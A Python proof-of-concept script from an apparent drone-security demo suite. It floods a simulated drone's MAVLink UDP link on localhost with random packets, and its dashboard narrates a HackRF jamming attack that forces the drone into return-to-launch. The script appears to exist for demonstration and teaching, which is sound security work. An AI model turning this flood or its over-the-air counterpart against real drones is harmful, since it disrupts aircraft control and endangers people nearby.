#!/usr/bin/env python3
"""PoC 05 - Jamming / DoS (Terminal 2 — attacker).

Requires the drone running in Terminal 1 (`python attacks/demos/drone.py`).
Saturates the link channel in a SUSTAINED way: in Terminal 1 the drone loses the
downlink and, after exceeding the failsafe timeout, enters RTL and STAYS there
(permanent effect) even if the jammer is turned off. Over-the-air version:
attacks/05-jamming/jam_aire.py
"""
import argparse
import os
import socket
import threading
os.environ.setdefault("MAVLINK20", "1")
from pwnuav.tui import ClientLink, Activity, hw_check, Steps, run_dashboard


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=14550)
    ap.add_argument("--hold", type=float, default=9.0, help="seconds of sustained jamming")
    ap.add_argument("--plain", action="store_true")
    ap.add_argument("--seconds", type=float, default=None)
    a = ap.parse_args()

    link = ClientLink(f"udpout:127.0.0.1:{a.port}"); act = Activity(); hw = hw_check()
    act.log("hardware checked — HackRF as jammer, RTL as monitor")

    st = {"stop": None, "th": None}

    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        pl = b"\xfd" + os.urandom(260); n = 0
        while not st["stop"].is_set():
            try:
                s.sendto(pl, ("127.0.0.1", a.port)); n += 1
                if n % 400 == 0:
                    import time as _t; _t.sleep(0.001)
            except OSError:
                pass

    def s1(): act.log(f"[BASELINE] link OK  ~{link.rate()} msg/s   packet loss 0%")
    def s2(): act.log(f"[IM] jammer HackRF ON — AWGN over the GFSK band, sustained {a.hold:.0f}s")
    def jam_on():
        st["stop"] = threading.Event()
        st["th"] = threading.Thread(target=flood, daemon=True); st["th"].start()
        act.log("[IM-01] channel saturated -> LINK DENIED (downlink lost)")
    def during(): act.log(f"[IM] telemetry 0 msg/s — link denied (link ~{link.rate()}/s)")
    def fs_note():
        act.log("[IM-02] loss > failsafe timeout -> the drone enters RTL (see Terminal 1)")
    def jam_off():
        if st["stop"]: st["stop"].set()
        act.log("[IM] jammer OFF — the channel returns, but the drone already committed to RTL")
    def s3(): act.log("[+] effective DoS: failsafe tripped -> RTL / LAND (permanent effect)")

    T_ON = 1.7
    events = [(0.7, s1), (1.5, s2), (T_ON, jam_on)]
    t = T_ON + 2.0
    while t < T_ON + a.hold - 0.5:
        events.append((t, during)); t += 2.0
    events.append((T_ON + 4.3, fs_note))
    events.append((T_ON + a.hold, jam_off))
    events.append((T_ON + a.hold + 1.3, s3))
    steps = Steps(events)

    run_dashboard("PoC 05 — Jamming / DoS", hw, link, act, steps,
                  total=a.seconds, plain=a.plain)
    if st["stop"]: st["stop"].set()
    link.close()


if __name__ == "__main__":
    main()
